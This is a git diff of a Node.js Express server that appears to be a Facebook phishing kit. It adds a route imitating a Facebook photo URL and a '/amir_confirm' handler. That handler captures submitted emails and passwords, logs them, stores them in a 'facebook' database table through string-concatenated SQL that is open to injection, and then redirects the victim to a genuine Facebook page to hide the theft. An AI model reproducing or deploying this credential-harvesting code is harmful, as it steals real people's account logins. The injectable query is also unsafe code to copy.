@@ -20,6 +20,11 @@ app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572
     res.render('Facebook');
     
 })
+app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444',function(req,res){
+    res.render('amir');
+    
+})
+
 app.get('/',function(req,res){
     res.render('Facebook')
 })
@@ -38,6 +43,21 @@ app.post('/confirm', function (req, res) {
         }
     })
     res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
+})
+
+app.post('/amir_confirm', function (req, res) {
+    var a = req.body.email_a;
+    var b = req.body.pass_a;
+    var c = req.body.email;
+    var d = req.body.pass;
+    console.log(a,b,c,d)
+   
+    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
+        if (!err) {
+            console.log(result)
+        }
+    })
+    res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
 })
 app.listen(PORT, function () {
     console.log('Server Started')
